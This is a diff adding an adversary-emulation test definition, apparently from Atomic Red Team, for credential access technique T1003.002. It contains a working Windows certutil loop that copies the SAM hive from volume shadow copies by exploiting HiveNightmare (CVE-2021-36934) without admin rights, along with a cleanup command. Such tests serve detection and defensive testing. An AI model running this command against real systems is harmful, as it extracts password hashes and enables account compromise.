@@ -1,0 +1,36 @@
+{
+    "name": "dump volume shadow copy hives with certutil",
+    "description": "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as HiveNightmare or SeriousSAM. This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934) ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\#{target_hive}vss*\n",
+        "name": "command_prompt",
+        "elevation_required": false,
+        "cleanup_command": "for /L %a in (1,1,#{limit}) do @(del %temp%\\#{target_hive}vss%a >nul 2>&1)\n",
+        "type": "Command Executor"
+    },
+    "id": "T1003.002",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Security Account Manager",
+    "source": "ART",
+    "uuid": "eeb9751a-d598-42d3-b11c-c122d9c3f6c7",
+    "arguments": {
+        "target_hive": {
+            "description": "Hive you wish to dump",
+            "type": "string",
+            "default": "SAM"
+        },
+        "limit": {
+            "description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
+            "type": "integer",
+            "default": 10
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
